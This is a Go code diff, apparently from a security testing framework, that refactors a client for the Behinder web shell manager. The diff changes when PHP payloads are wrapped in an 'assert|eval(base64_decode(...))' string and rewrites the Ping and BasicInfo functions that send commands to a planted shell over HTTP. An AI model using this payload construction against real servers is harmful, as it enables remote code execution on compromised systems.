@@ -218,8 +218,10 @@ func (b *Behinder) getPayload(binCode behinder.Payload, params map[string]string
 		if err != nil {
 			return nil, err
 		}
+		if b.customPacketEncoder == nil && b.PacketScriptContent == "" {
+			rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
+		}
 		//rawPayload = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
-		rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
 	case ypb.ShellScript_ASPX.String():
 		rawPayload, err = behinder.GetRawAssembly(hexCode, params)
 		if err != nil {
@@ -390,25 +392,6 @@ func (b *Behinder) processBase64JSON(input []byte) ([]byte, error) {
 	return decodedJSON, nil
 }
 
-func (b *Behinder) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
-	params := make(map[string]string)
-	params["content"] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-	params = behinder.ProcessParams(params, opts...)
-
-	payload, err := b.getPayload(behinder.EchoGo, params)
-	if err != nil {
-		return false, err
-	}
-	//
-	//res, err := b.sendPayload(payload)
-	res, err := b.SendHttpRequest(payload)
-	if err != nil {
-		return false, err
-	}
-	log.Infof("%q", res)
-	return true, nil
-}
-
 func (b *Behinder) sendRequestAndGetResponse(payloadType behinder.Payload, params map[string]string) ([]byte, error) {
 	payload, err := b.getPayload(payloadType, params)
 	if err != nil {
@@ -426,9 +409,30 @@ func (b *Behinder) sendRequestAndGetResponse(payloadType behinder.Payload, param
 	return jsonByte, nil
 }
 
+func (b *Behinder) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
+	params := map[string]string{
+		"content": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+	}
+	b.processParams(params)
+
+	payload, err := b.getPayload(behinder.EchoGo, params)
+	if err != nil {
+		return false, err
+	}
+	//
+	//res, err := b.sendPayload(payload)
+	res, err := b.SendHttpRequest(payload)
+	if err != nil {
+		return false, err
+	}
+	log.Infof("%q", res)
+	return true, nil
+}
+
 func (b *Behinder) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
-	params := make(map[string]string)
-	params["whatever"] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+	params := map[string]string{
+		"whatever": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+	}
 	params = behinder.ProcessParams(params, opts...)
 	return b.sendRequestAndGetResponse(behinder.BasicInfoGo, params)
 }
